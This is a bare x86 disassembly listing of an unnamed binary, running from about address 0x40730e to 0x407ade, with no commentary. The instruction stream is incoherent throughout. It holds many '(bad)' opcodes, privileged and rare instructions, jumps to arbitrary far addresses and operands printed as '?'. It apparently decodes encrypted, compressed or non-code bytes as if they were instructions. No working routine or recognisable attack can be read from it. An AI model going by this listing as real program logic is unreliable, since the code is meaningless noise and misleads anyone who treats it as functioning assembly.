  40730e:	ins    BYTE PTR es:[edi],dx
  40730f:	xor    esp,DWORD PTR [esi]
  407311:	or     BYTE PTR [ecx],0xe1
  407314:	outs   dx,BYTE PTR ds:[esi]
  407315:	(bad)  
  407316:	fisubr WORD PTR [ebx-0xc]
  407319:	cmp    eax,0x947b6dd1
  40731e:	loopne 0x4072bc
  407320:	and    cl,bl
  407322:	jmp    0xe725c0cb
  407327:	push   ecx
  407328:	mov    eax,0x3d6d2b69
  40732d:	lock ror DWORD PTR [eax],0x1c
  407331:	sbb    al,0x1e
  407333:	mov    ebx,0xe4f272aa
  407338:	stc    
  407339:	arpl   WORD PTR [ebx-0x78b2929c],sp
  40733f:	daa    
  407340:	xchg   ecx,eax
  407341:	out    dx,al
  407342:	repnz cdq 
  407344:	scas   eax,DWORD PTR es:[edi]
  407345:	sub    al,0x82
  407347:	mov    edi,0xbd06fc92
  40734c:	and    al,BYTE PTR [ecx]
  40734e:	call   DWORD PTR [ebp-0x35]
  407351:	push   0xffffff85
  407353:	sbb    ch,BYTE PTR [eax]
  407355:	jl     0x407313
  407357:	mov    WORD PTR [edx],?
  407359:	push   eax
  40735a:	ins    DWORD PTR es:[edi],dx
  40735b:	xchg   DWORD PTR [esi-0x634d5379],eax
  407361:	aas    
  407362:	nop
  407363:	retf   0xb544
  407366:	ds mov dh,0x76
  407369:	aas    
  40736a:	imul   eax,DWORD PTR [eax-0x46151baf],0xf51cfd0
  407374:	or     DWORD PTR [ebx+0x2f9a336e],ebx
  40737a:	imul   eax,edx,0x9a3f3e78
  407380:	xchg   esp,eax
  407381:	call   0xe52e96fd
  407386:	imul   edx,ebx,0x16b93e3
  40738c:	adc    ch,ah
  40738e:	(bad)  
  40738f:	sub    eax,0xa656aee8
  407394:	retf   0xd4ef
  407397:	out    dx,al
  407398:	pop    esi
  407399:	sbb    ah,BYTE PTR [esi]
  40739b:	jae    0x4073d5
  40739d:	jmp    0x89e0:0x82ba21a5
  4073a4:	add    al,ah
  4073a6:	mov    al,0xdb
  4073a8:	cmp    DWORD PTR [edi+ebp*4-0x3c],edi
  4073ac:	or     BYTE PTR [ebx+0x552e3e58],ah
  4073b2:	test   ch,dl
  4073b4:	or     al,BYTE PTR [ecx-0x3fee8603]
  4073ba:	iret   
  4073bb:	add    esp,DWORD PTR [eax]
  4073bd:	add    DWORD PTR [ebx],ecx
  4073bf:	cld    
  4073c0:	mov    ds:0x73be9c05,eax
  4073c5:	adc    BYTE PTR [ebx],ch
  4073c7:	sbb    ah,0x4b
  4073ca:	outs   dx,BYTE PTR ds:[esi]
  4073cb:	sbb    al,0x2f
  4073cd:	out    0x15,eax
  4073cf:	out    dx,eax
  4073d0:	mov    ah,0x2
  4073d2:	mov    esp,0x3c453a8
  4073d7:	push   esp
  4073d8:	fild   DWORD PTR [ecx+0x33]
  4073db:	pop    edi
  4073dc:	push   edi
  4073dd:	out    dx,eax
  4073de:	mov    cs,WORD PTR [ebp-0x10]
  4073e1:	scas   al,BYTE PTR es:[edi]
  4073e2:	test   al,0x21
  4073e4:	aas    
  4073e5:	jae    0x4073bc
  4073e7:	in     eax,dx
  4073e8:	fwait
  4073e9:	and    ebx,DWORD PTR [edi+ebx*4]
  4073ec:	push   cs
  4073ed:	addr16 push edi
  4073ef:	aad    0x30
  4073f1:	xor    edx,DWORD PTR [ecx-0x39]
  4073f4:	mov    edx,DWORD PTR [eax+ecx*2]
  4073f7:	cmp    ebp,esp
  4073f9:	out    dx,eax
  4073fa:	pop    ss
  4073fb:	ss sub ch,0x2b
  4073ff:	std    
  407400:	(bad)  
  407401:	hlt    
  407402:	outs   dx,BYTE PTR ds:[esi]
  407403:	sar    BYTE PTR [esi+0x5a],1
  407406:	dec    eax
  407407:	dec    eax
  407408:	jg     0x407441
  40740a:	xor    eax,0xbf0b5071
  40740f:	sbb    esp,DWORD PTR [eax-0x5a]
  407412:	jne    0x407478
  407414:	push   es
  407415:	or     bl,ah
  407417:	out    dx,al
  407418:	mov    esp,0xeb2e7f4a
  40741d:	xchg   DWORD PTR [ebx-0x451ce8d1],esp
  407423:	test   BYTE PTR [esi],dh
  407425:	imul   ebp,DWORD PTR [edi-0x551befe8],0xfffffff4
  40742c:	and    al,0x6f
  40742e:	fsub   DWORD PTR [edi+0x2be18d19]
  407434:	pop    esi
  407435:	and    dl,BYTE PTR [ebp-0x61]
  407438:	mov    ss,WORD PTR [ecx-0x45]
  40743b:	xor    BYTE PTR [bx+0x2120],al
  407440:	push   dx
  407442:	fst    QWORD PTR [ecx-0x7b55a8b0]
  407448:	mov    eax,ds:0x591d5b6a
  40744d:	rcl    ah,cl
  40744f:	and    eax,0x123e5ac4
  407454:	scas   al,BYTE PTR es:[edi]
  407455:	sub    al,0x21
  407457:	gs push cs
  407459:	cld    
  40745a:	dec    eax
  40745b:	icebp  
  40745c:	scas   al,BYTE PTR es:[edi]
  40745d:	pop    ss
  40745e:	sub    BYTE PTR [ebp+0x58],0xe3
  407462:	(bad)  
  407463:	setge  dl
  407466:	mov    al,0x77
  407468:	dec    eax
  407469:	imul   ebx,DWORD PTR [esi+0x55c3fa08],0x8
  407470:	mov    ch,0x6
  407472:	or     esp,ebx
  407474:	mov    ebp,0x6054f91a
  407479:	rol    DWORD PTR [esi],cl
  40747b:	test   eax,0x94cdc68a
  407480:	jne    0x40740d
  407482:	aas    
  407483:	mov    ?,WORD PTR [eax+0x3]
  407486:	push   ds
  407487:	inc    esi
  407488:	aas    
  407489:	ret    
  40748a:	pop    es
  40748b:	mov    bl,0x9a
  40748d:	add    DWORD PTR [eax+0x42],0x6a9ba72a
  407494:	add    eax,0x50cb4d58
  407499:	sti    
  40749a:	test   BYTE PTR [ebx+0x33],0x1
  40749e:	xor    BYTE PTR [ecx+0x4c],0x6d
  4074a2:	add    dh,BYTE PTR [ecx]
  4074a4:	mov    WORD PTR [ebx-0x5f9e6fcc],?
  4074aa:	push   esp
  4074ab:	test   eax,0xa234787c
  4074b0:	pop    eax
  4074b1:	adc    esp,DWORD PTR [edi-0x292488ec]
  4074b7:	rcl    DWORD PTR [eax+ebp*8],cl
  4074ba:	scas   eax,DWORD PTR es:[edi]
  4074bb:	xor    DWORD PTR ds:0x9af2ca5d,0x23
  4074c2:	lock nop
  4074c4:	retf   0xfc7
  4074c7:	mov    eax,0xff33b938
  4074cc:	ja     0x407471
  4074ce:	and    al,0x80
  4074d0:	mov    ebx,DWORD PTR [ecx+0x65b6bbce]
  4074d6:	in     eax,dx
  4074d7:	das    
  4074d8:	mov    al,0xf6
  4074da:	inc    esp
  4074db:	rcl    DWORD PTR [eax-0x5a],cl
  4074de:	pop    edi
  4074df:	or     BYTE PTR ds:0xa1e4cd04,cl
  4074e5:	mov    ebx,ebp
  4074e7:	aad    0xa5
  4074e9:	retf   
  4074ea:	lds    eax,FWORD PTR [edx+0x72476980]
  4074f0:	dec    edx
  4074f1:	test   BYTE PTR [edi],bh
  4074f3:	mov    esp,0x227ce112
  4074f8:	(bad)  
  4074f9:	xchg   ecx,eax
  4074fa:	shl    DWORD PTR [eax+0x29],0xcf
  4074fe:	imul   ebp,DWORD PTR [edx-0x7e],0xffffffdf
  407502:	pop    ss
  407503:	jp     0x407509
  407505:	repnz (bad) 
  407507:	retf   
  407508:	mov    al,ds:0x770d6661
  40750d:	dec    eax
  40750e:	loopne 0x4074be
  407510:	jge    0x407502
  407512:	lahf   
  407513:	push   ds
  407514:	cs das 
  407516:	sbb    dh,BYTE PTR [eax-0x5c]
  407519:	dec    eax
  40751a:	test   eax,0x9013d75
  40751f:	call   0x2c54:0x47d1c5c0
  407526:	jns    0x40755a
  407528:	sahf   
  407529:	syscall 
  40752b:	inc    edi
  40752c:	xchg   ebp,eax
  40752d:	out    dx,eax
  40752e:	popa   
  40752f:	jge    0x4074ef
  407531:	sbb    BYTE PTR [esi],dl
  407533:	into   
  407534:	das    
  407535:	mov    ah,0xa
  407537:	sub    al,0x42
  407539:	mov    esi,0x81ade424
  40753e:	lods   al,BYTE PTR ds:[esi]
  40753f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407540:	and    eax,0xa81155f
  407545:	(bad)  
  407546:	sbb    DWORD PTR [edx+esi*1-0x66],edi
  40754a:	and    edx,DWORD PTR [ecx+0x27]
  40754d:	or     BYTE PTR [edi],al
  40754f:	in     eax,0x99
  407551:	xchg   esp,eax
  407552:	jnp    0x407599
  407554:	add    BYTE PTR [ecx+0x2f399dc8],ah
  40755a:	add    ch,BYTE PTR [eax+eiz*8+0xa]
  40755e:	xor    al,0x17
  407561:	or     esp,0xffffffc3
  407564:	inc    ebx
  407565:	xlat   BYTE PTR ds:[ebx]
  407566:	xor    DWORD PTR [esi],edi
  407568:	add    ebx,DWORD PTR [esi-0x63]
  40756b:	sbb    eax,0x969a4d15
  407570:	inc    eax
  407571:	in     al,dx
  407572:	rol    DWORD PTR [edi-0x30],1
  407575:	mov    eax,0x21696562
  40757a:	adc    eax,DWORD PTR [ebp-0x5f]
  40757d:	js     0x407584
  40757f:	pop    esi
  407580:	jb     0x40754c
  407582:	adc    al,0xa
  407584:	mov    bh,0x5c
  407586:	jp     0x407568
  407588:	out    dx,eax
  407589:	in     al,0xcb
  40758b:	push   esi
  40758c:	jae    0x407578
  40758e:	cdq    
  40758f:	xchg   ecx,eax
  407590:	xor    DWORD PTR [ecx],esp
  407592:	jge    0x407575
  407594:	mov    fs,WORD PTR [edi-0x4]
  407597:	add    edi,DWORD PTR [ecx-0x54]
  40759a:	in     al,dx
  40759b:	jno    0x4075b8
  40759d:	inc    esp
  40759e:	jne    0x4075df
  4075a0:	jae    0x40761c
  4075a2:	jl     0x407592
  4075a4:	loopne 0x4075fa
  4075a6:	add    al,0xf1
  4075a8:	and    dl,BYTE PTR [ecx-0x41dd8fff]
  4075ae:	fsub   QWORD PTR ds:0x10c9e4b2
  4075b4:	inc    edx
  4075b5:	clc    
  4075b6:	jg     0x40762c
  4075b8:	lahf   
  4075b9:	cs dec ebp
  4075bb:	jle    0x4075da
  4075bd:	shl    BYTE PTR ss:[ebp-0x9],cl
  4075c1:	push   ds
  4075c2:	cmp    eax,0xc935312a
  4075c7:	stos   BYTE PTR es:[edi],al
  4075c8:	outs   dx,DWORD PTR ds:[esi]
  4075c9:	pop    esi
  4075ca:	fnstcw WORD PTR [ecx-0x722559e8]
  4075d0:	clc    
  4075d1:	bound  esi,QWORD PTR [ecx-0x29346618]
  4075d7:	and    BYTE PTR [eax-0x50],dl
  4075da:	retf   
  4075db:	jb     0x40756a
  4075dd:	cld    
  4075de:	add    al,0x47
  4075e0:	pop    edx
  4075e1:	not    edi
  4075e3:	aas    
  4075e4:	fs or  ebp,esp
  4075e7:	or     al,0xe5
  4075e9:	(bad)  
  4075ea:	pop    edi
  4075eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075ec:	inc    edx
  4075ed:	(bad)  
  4075ee:	inc    ebx
  4075ef:	or     eax,0xd844bd31
  4075f4:	nop
  4075f5:	dec    esp
  4075f6:	stos   BYTE PTR es:[edi],al
  4075f7:	jnp    0x40764f
  4075f9:	sub    eax,0x5932dfd2
  4075fe:	lea    ebx,[esi]
  407600:	dec    eax
  407601:	loop   0x4075ba
  407603:	xor    ebp,DWORD PTR [esi+esi*4+0x6e]
  407607:	mov    al,0x5f
  407609:	and    DWORD PTR [esi],ebp
  40760b:	cmp    eax,0x28414fb0
  407610:	ins    BYTE PTR es:[edi],dx
  407611:	cmp    eax,0xa20a8a91
  407616:	jmp    0x407598
  407618:	adc    al,0xf3
  40761a:	and    ah,BYTE PTR [eax+0x2ecb9eb9]
  407620:	push   0x9e82def0
  407625:	icebp  
  407626:	jo     0x407613
  407628:	adc    BYTE PTR [ecx+0xbab33d3],ch
  40762e:	sbb    DWORD PTR [eax+ecx*4+0x3],ecx
  407632:	leave  
  407633:	cmc    
  407634:	sbb    eax,0xfd5cec42
  407639:	sti    
  40763a:	out    dx,al
  40763b:	cs fsubr QWORD PTR fs:[ebp-0x7de84c14]
  407643:	(bad)  
  407644:	sub    eax,0xcf709df4
  407649:	sti    
  40764a:	jmp    0x407609
  40764c:	int3   
  40764d:	pop    edi
  40764e:	sar    DWORD PTR [ebp+0x267828fd],1
  407654:	mov    ebp,DWORD PTR [ecx-0x22]
  407657:	xchg   ebp,edx
  407659:	imul   ebp,DWORD PTR [ebp+edi*8+0x45],0xffffffd9
  40765e:	jne    0x407625
  407660:	xor    BYTE PTR [edi+0x4fa662fd],0xe3
  407667:	xchg   edx,eax
  407668:	shl    DWORD PTR [esi-0x474c460c],0x6e
  40766f:	test   eax,0xdc29dbb9
  407674:	or     DWORD PTR [ebx+0x709381a7],0x366178b1
  40767e:	jecxz  0x40763d
  407680:	gs adc eax,0xd0885716
  407686:	repz call DWORD PTR [ecx+0x798e2c10]
  40768d:	or     edx,DWORD PTR [ebp+0x5eae262d]
  407693:	shl    DWORD PTR [ebp-0x13],0xdc
  407697:	fs mov esi,0x22b6c3cc
  40769d:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40769f:	inc    esp
  4076a0:	push   ss
  4076a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076a2:	pop    ss
  4076a3:	mov    ss,WORD PTR [ebx]
  4076a5:	stos   DWORD PTR es:[edi],eax
  4076a6:	ss sysexit 
  4076a9:	aam    0x64
  4076ab:	gs out dx,al
  4076ad:	ins    BYTE PTR es:[edi],dx
  4076ae:	mov    al,0x49
  4076b0:	test   al,0x44
  4076b2:	cmp    ah,al
  4076b4:	mov    eax,ds:0xad2ed0e5
  4076b9:	xchg   edx,eax
  4076ba:	xor    eax,0xaf7e117
  4076bf:	push   esp
  4076c0:	shl    BYTE PTR [ecx+0x75],cl
  4076c3:	xchg   esi,eax
  4076c4:	pop    edx
  4076c5:	(bad)  
  4076c6:	push   eax
  4076c7:	das    
  4076c8:	mov    al,ds:0x6b50d81c
  4076cd:	dec    ebp
  4076ce:	mul    BYTE PTR [esi+0x70]
  4076d1:	xchg   ebx,eax
  4076d2:	dec    edx
  4076d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076d4:	aaa    
  4076d5:	hlt    
  4076d6:	pop    es
  4076d7:	jle    0x407661
  4076d9:	jle    0x4076c6
  4076db:	jle    0x407734
  4076dd:	(bad)  
  4076de:	mov    esi,0xa8d64959
  4076e3:	retf   
  4076e4:	inc    esi
  4076e5:	push   ebx
  4076e6:	test   al,0x17
  4076e8:	dec    BYTE PTR [edi]
  4076ea:	fidiv  DWORD PTR [esi]
  4076ec:	loop   0x4076aa
  4076ee:	jbe    0x407694
  4076f0:	popf   
  4076f1:	push   cs
  4076f2:	stc    
  4076f3:	test   al,0xa8
  4076f5:	ins    DWORD PTR es:[edi],dx
  4076f6:	sub    al,0x4b
  4076f8:	(bad)  
  4076f9:	iret   
  4076fa:	push   ds
  4076fb:	and    al,0xf4
  4076fd:	or     eax,0xbc3417ff
  407702:	mov    al,ds:0x5c74dd84
  407707:	nop
  407708:	scas   eax,DWORD PTR es:[edi]
  407709:	push   ss
  40770a:	lods   al,BYTE PTR ds:[esi]
  40770b:	cmp    BYTE PTR [ecx],bh
  40770d:	mov    al,0x88
  40770f:	je     0x407691
  407711:	loopne 0x40773a
  407713:	into   
  407714:	jg     0x4076fa
  407716:	mov    al,0x53
  407718:	cmp    BYTE PTR [ebx+eax*1+0x33],dl
  40771c:	mov    ds:0x9143d2b8,eax
  407721:	mov    ebx,0xb07354a8
  407726:	mov    ds:0x30911607,al
  40772b:	lea    edx,[ebx+eax*4-0x1551fc3e]
  407732:	shr    BYTE PTR [edx],0xa8
  407735:	push   edi
  407736:	lods   eax,DWORD PTR ds:[esi]
  407737:	iret   
  407738:	fsubr  QWORD PTR [eax+0x5d]
  40773b:	jnp    0x407700
  40773d:	das    
  40773e:	mov    ecx,0x25654475
  407743:	test   DWORD PTR [ebx+esi*8-0x3514e164],ebx
  40774a:	aam    0xe5
  40774c:	dec    ecx
  40774d:	jecxz  0x407708
  40774f:	pop    esi
  407750:	int3   
  407751:	lods   eax,DWORD PTR ds:[esi]
  407752:	inc    esp
  407753:	not    DWORD PTR [ecx+0x1d]
  407756:	add    DWORD PTR ds:0x1d97243,0x6c
  40775d:	cmp    al,0x61
  40775f:	shr    DWORD PTR [esi+edi*2-0x65],1
  407763:	mov    edi,0xb258b81f
  407768:	lods   eax,DWORD PTR ds:[esi]
  407769:	(bad)  
  40776a:	clc    
  40776b:	add    al,BYTE PTR [esi-0xefcf025]
  407771:	(bad)  
  407772:	pop    ebx
  407773:	lods   al,BYTE PTR ds:[esi]
  407774:	sub    eax,0xf001935e
  407779:	rcl    DWORD PTR [esp+edx*8],0xa2
  40777d:	aaa    
  40777e:	mov    esi,0x9f9ae958
  407783:	ja     0x407740
  407785:	lock or BYTE PTR [edi+0x6de3971e],al
  40778c:	and    al,0xc
  40778e:	sbb    al,0x28
  407790:	test   DWORD PTR [esi+0x45],0x830b6c67
  407797:	jecxz  0x40776c
  407799:	push   esp
  40779a:	shl    cl,0x1f
  40779d:	fwait
  40779e:	ret    
  40779f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077a0:	call   0xfe8d0712
  4077a5:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4077a7:	arpl   WORD PTR [eax*1+0x75879723],sp
  4077ae:	xchg   DWORD PTR [ebx+0x62715ce5],ecx
  4077b4:	outs   dx,BYTE PTR ds:[esi]
  4077b5:	cmp    eax,0x7d72b51b
  4077ba:	sti    
  4077bb:	iret   
  4077bc:	jmp    0x53739d91
  4077c1:	and    edi,DWORD PTR [ecx-0x58]
  4077c4:	mov    dh,0x3e
  4077c6:	addr16 inc ebx
  4077c8:	daa    
  4077c9:	scas   al,BYTE PTR es:[edi]
  4077ca:	adc    BYTE PTR gs:[edi-0x23],ch
  4077ce:	out    dx,al
  4077cf:	jmp    0x7d6c:0x3d0c7167
  4077d6:	jno    0x407790
  4077d8:	test   al,0xbb
  4077da:	rol    DWORD PTR [edx-0x79c927fa],cl
  4077e0:	cli    
  4077e1:	or     eax,0x98c03dc2
  4077e6:	sub    DWORD PTR [ebx+edx*4+0x1a],edi
  4077ea:	cmc    
  4077eb:	lds    ecx,FWORD PTR [esi]
  4077ed:	or     ebx,edx
  4077ef:	movzx  eax,WORD PTR [eax+0x47]
  4077f3:	inc    edi
  4077f4:	lock mov ah,0xa0
  4077f7:	and    dh,BYTE PTR [esi-0x4d1f6521]
  4077fd:	or     BYTE PTR ds:0x10417113,dl
  407803:	push   edx
  407804:	or     bl,BYTE PTR ss:[esi+0x42ab00c3]
  40780b:	mov    eax,ds:0x6acecf4e
  407810:	sub    al,0xd3
  407812:	and    DWORD PTR [eax],esi
  407814:	sub    DWORD PTR ds:0xd9e62dc2,eax
  40781a:	or     cl,BYTE PTR ss:[edx]
  40781d:	mov    ebp,ebp
  40781f:	mov    eax,0x7f66f03d
  407824:	out    dx,al
  407825:	leave  
  407826:	loopne 0x4077af
  407828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407829:	adc    DWORD PTR [eax+edx*8],esp
  40782c:	dec    edi
  40782d:	es push ecx
  40782f:	sar    BYTE PTR [eax-0x33],0x90
  407833:	dec    ebp
  407834:	test   eax,0xd35aff4d
  407839:	dec    ebp
  40783a:	xchg   ebp,eax
  40783b:	jbe    0x407818
  40783d:	sbb    BYTE PTR ds:0x32175023,al
  407843:	jne    0x4077d7
  407845:	loopne 0x40782c
  407847:	mov    ds,eax
  407849:	inc    ebx
  40784a:	and    BYTE PTR [ebp+0x49],al
  40784d:	xchg   DWORD PTR ds:0xaf4ae2ce,eax
  407853:	in     eax,dx
  407854:	cmp    al,0xd2
  407856:	push   ecx
  407857:	mov    dl,0x9b
  407859:	loopne 0x407832
  40785b:	sbb    bh,BYTE PTR [ecx]
  40785d:	adc    bh,BYTE PTR [edi]
  40785f:	out    0x6f,al
  407861:	inc    edi
  407862:	test   eax,0x4edfb2b2
  407867:	ds loop 0x40781e
  40786a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40786b:	int    0x5
  40786d:	gs stc 
  40786f:	and    DWORD PTR [esi+esi*8-0x4e2fa54e],ebx
  407876:	sbb    eax,0x5bb1b1a6
  40787b:	adc    DWORD PTR [ebp-0x1f],0xfffffff1
  40787f:	test   eax,0xe3057520
  407884:	scas   al,BYTE PTR es:[edi]
  407885:	icebp  
  407886:	ret    0x2fcb
  407889:	cwde   
  40788a:	out    dx,eax
  40788b:	mov    eax,ds:0x13e6812c
  407890:	jge    0x40784b
  407892:	mov    ds:0xa166029d,al
  407897:	mov    ds:0xd948d91d,eax
  40789c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40789d:	jns    0x4078e5
  40789f:	add    BYTE PTR [edi],0x1a
  4078a2:	scas   al,BYTE PTR es:[edi]
  4078a3:	outs   dx,BYTE PTR ds:[esi]
  4078a4:	and    dl,dl
  4078a6:	ins    BYTE PTR es:[edi],dx
  4078a7:	ins    BYTE PTR es:[edi],dx
  4078a8:	xchg   BYTE PTR [edx],ch
  4078aa:	arpl   si,ax
  4078ac:	shl    BYTE PTR [edi+0x49],cl
  4078af:	inc    edi
  4078b0:	js     0x40786c
  4078b2:	aad    0xa4
  4078b4:	pop    ds
  4078b5:	in     eax,0xe0
  4078b7:	dec    ebp
  4078b8:	das    
  4078b9:	and    DWORD PTR [edi],ecx
  4078bb:	into   
  4078bc:	jg     0x6404a767
  4078c2:	pop    ss
  4078c3:	shl    DWORD PTR [ecx],1
  4078c5:	cdq    
  4078c6:	cmp    eax,0x4afae930
  4078cb:	push   esi
  4078cc:	aas    
  4078cd:	jo     0x407858
  4078cf:	adc    eax,0x69cb9bf0
  4078d4:	xchg   edi,eax
  4078d5:	dec    esp
  4078d6:	push   ss
  4078d7:	mov    edx,DWORD PTR [esi+0x16]
  4078da:	loope  0x407896
  4078dc:	mov    ebp,0x410c8d3c
  4078e1:	jg     0x40793e
  4078e3:	shl    BYTE PTR [esi+0x39],cl
  4078e6:	push   edi
  4078e7:	sbb    DWORD PTR [edi],edi
  4078e9:	sti    
  4078ea:	das    
  4078eb:	jg     0x4078ee
  4078ed:	stos   DWORD PTR es:[edi],eax
  4078ee:	cmc    
  4078ef:	inc    ebp
  4078f0:	mov    BYTE PTR [ebp+ebx*2+0x22cc303e],bh
  4078f7:	xor    DWORD PTR [edi-0x1e55f03d],edx
  4078fd:	fiadd  DWORD PTR [edi+esi*1+0x32]
  407901:	loopne 0x407948
  407903:	call   0x61a29b39
  407908:	enter  0xa81b,0x40
  40790c:	or     DWORD PTR [edi+0x159e4078],0xb85e2b66
  407916:	or     eax,0xef5cc057
  40791b:	daa    
  40791c:	inc    ebp
  40791d:	repz pop ss
  40791f:	shr    DWORD PTR [esi-0x6bbb6557],cl
  407925:	xchg   DWORD PTR [edx+0x438d8b5e],eax
  40792b:	out    dx,al
  40792c:	add    bl,BYTE PTR [ebx+0x29]
  40792f:	fstp   st(4)
  407931:	in     al,dx
  407932:	push   ds
  407933:	inc    eax
  407934:	cmp    bh,ch
  407936:	sti    
  407937:	mov    al,0x91
  407939:	xor    cl,dh
  40793b:	pop    ebx
  40793c:	pop    ds
  40793d:	xchg   esi,eax
  40793e:	mov    es:0x18a5971,eax
  407944:	jmp    0x1573f4f7
  407949:	lock xor bl,cl
  40794c:	mov    bh,0x4e
  40794e:	and    eax,0x75737c67
  407953:	or     DWORD PTR [eax],ecx
  407955:	push   esp
  407956:	or     DWORD PTR [esp+eiz*2],edi
  407959:	ret    0x543c
  40795c:	inc    esi
  40795d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40795e:	adc    eax,0xf1c77748
  407963:	or     edi,DWORD PTR [edi+0x56]
  407966:	rcl    DWORD PTR [edi-0x45e92f61],cl
  40796c:	dec    edx
  40796d:	stos   BYTE PTR es:[edi],al
  40796e:	test   BYTE PTR [eax-0x5d],0xdd
  407972:	pop    eax
  407973:	in     eax,dx
  407974:	cmp    DWORD PTR [ebx-0x72acdaf],esi
  40797a:	adc    eax,0xd424ec99
  40797f:	inc    edx
  407980:	mov    eax,ds:0x89e68a4b
  407985:	xchg   edx,eax
  407986:	pop    esi
  407987:	adc    BYTE PTR [ebp-0x71b30b85],bh
  40798d:	push   ebp
  40798e:	shr    BYTE PTR ds:0xb6b148b8,cl
  407994:	jae    0x407976
  407996:	xlat   BYTE PTR ds:[ebx]
  407997:	add    BYTE PTR [ebx-0xb],0x46
  40799b:	sbb    bl,BYTE PTR [esi]
  40799d:	push   esp
  40799e:	out    dx,eax
  40799f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079a0:	add    ah,ah
  4079a2:	inc    edx
  4079a3:	aaa    
  4079a4:	and    ch,dl
  4079a6:	call   0xc531:0xe168b3db
  4079ad:	add    al,0xe
  4079af:	mov    dh,0xd2
  4079b1:	fcom   QWORD PTR [bp+si]
  4079b4:	and    edi,ebx
  4079b6:	dec    esi
  4079b7:	or     bh,ah
  4079b9:	popa   
  4079ba:	jecxz  0x4079b8
  4079bc:	push   es
  4079bd:	jno    0x407a21
  4079bf:	out    dx,eax
  4079c0:	push   0xbce1b83
  4079c5:	stos   DWORD PTR es:[edi],eax
  4079c6:	loope  0x4079fe
  4079c8:	popa   
  4079c9:	push   esp
  4079ca:	inc    esi
  4079cb:	pop    esi
  4079cc:	xchg   edx,eax
  4079cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079ce:	or     eax,0xde6c8b8b
  4079d3:	mov    bh,0xb4
  4079d5:	loope  0x4079f8
  4079d7:	aas    
  4079d8:	arpl   ax,bp
  4079da:	xor    edi,edi
  4079dc:	xchg   DWORD PTR [edi-0x4967e465],esp
  4079e2:	add    DWORD PTR [ebx+esi*8],edi
  4079e5:	loopne 0x407a1b
  4079e7:	add    edi,DWORD PTR [esi-0x4e]
  4079ea:	fadd   QWORD PTR [ecx]
  4079ec:	test   BYTE PTR [esi],dh
  4079ee:	inc    dl
  4079f0:	retf   0xb448
  4079f3:	mov    ch,0x61
  4079f5:	les    ecx,FWORD PTR [edx+edx*2+0x7e]
  4079f9:	and    bl,BYTE PTR [ebp-0x4de5df92]
  4079ff:	and    eax,0xa1f70a33
  407a04:	(bad)  
  407a06:	leave  
  407a07:	mov    al,ds:0x5c58a7d6
  407a0c:	ja     0x4079a7
  407a0e:	jge    0x407a65
  407a10:	out    dx,eax
  407a11:	sub    BYTE PTR [ebx-0x77fd3ed2],bl
  407a17:	call   0xff65abda
  407a1c:	jecxz  0x407a88
  407a1e:	sbb    eax,0xe9b9f326
  407a23:	fisttp QWORD PTR [ebx+0x7390449]
  407a29:	(bad)  
  407a2a:	dec    edi
  407a2b:	in     al,0xd7
  407a2d:	sub    DWORD PTR [edx],edx
  407a2f:	nop
  407a30:	sub    eax,0x3e410e95
  407a35:	push   ecx
  407a36:	ins    BYTE PTR es:[edi],dx
  407a37:	ins    BYTE PTR es:[edi],dx
  407a38:	dec    esi
  407a39:	out    dx,al
  407a3a:	xor    al,0x5b
  407a3c:	nop
  407a3d:	mov    ebx,0xad761ad8
  407a42:	popa   
  407a43:	mov    ah,0x7d
  407a45:	fsubr  QWORD PTR [edx]
  407a47:	xor    edi,esp
  407a49:	lods   al,BYTE PTR ds:[esi]
  407a4a:	pusha  
  407a4b:	inc    DWORD PTR [edi+ecx*4-0x43]
  407a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a50:	test   DWORD PTR [esi+esi*8-0x24],edi
  407a54:	sbb    al,0x77
  407a56:	jg     0x407a60
  407a58:	das    
  407a59:	push   ecx
  407a5a:	mov    eax,DWORD PTR [edi]
  407a5c:	das    
  407a5d:	xchg   ebx,eax
  407a5e:	(bad)  
  407a60:	aas    
  407a61:	xchg   ebp,eax
  407a62:	mov    esi,0x9f71d18
  407a67:	xor    cl,ah
  407a69:	adc    cl,dl
  407a6b:	add    DWORD PTR ds:0xfa30a617,ebp
  407a71:	hlt    
  407a72:	mul    DWORD PTR [esp+ebx*4]
  407a75:	dec    ebx
  407a76:	sbb    al,0xee
  407a78:	or     al,0x43
  407a7a:	or     cl,dl
  407a7c:	mov    al,ds:0x86b5ad24
  407a81:	jne    0x407ac5
  407a83:	in     eax,dx
  407a84:	cmp    DWORD PTR [ecx],ebx
  407a86:	mov    ds:0x567e528e,eax
  407a8b:	dec    eax
  407a8c:	mov    bl,0xdb
  407a8e:	and    BYTE PTR [eax+0x35],dh
  407a91:	pop    esp
  407a92:	popf   
  407a93:	shl    bl,1
  407a95:	inc    edi
  407a96:	pop    ebp
  407a97:	stos   BYTE PTR es:[edi],al
  407a98:	cmc    
  407a99:	test   BYTE PTR [eax],al
  407a9b:	iret   
  407a9c:	jle    0x407a45
  407a9e:	and    esp,DWORD PTR ds:0xde06b931
  407aa4:	xor    ah,dl
  407aa6:	pusha  
  407aa7:	sbb    al,BYTE PTR [esi-0x7e695f36]
  407aad:	inc    edi
  407aae:	icebp  
  407aaf:	ret    
  407ab0:	sahf   
  407ab1:	dec    edx
  407ab2:	sbb    al,0xc5
  407ab4:	mov    ebp,0x55823995
  407ab9:	push   esp
  407aba:	ret    0xc4d1
  407abd:	test   eax,0xe9d6b255
  407ac2:	ja     0x407a6e
  407ac4:	call   0x2b87:0xb2cc2cea
  407acb:	cld    
  407acc:	scas   eax,DWORD PTR es:[edi]
  407acd:	and    edx,DWORD PTR [eax+0x6ed428d4]
  407ad3:	lods   al,BYTE PTR ds:[esi]
  407ad4:	mov    edi,DWORD PTR [ebx-0x3f5679e0]
  407ada:	loope  0x407b3b
  407adc:	jge    0x407a8b
  407ade:	aas    
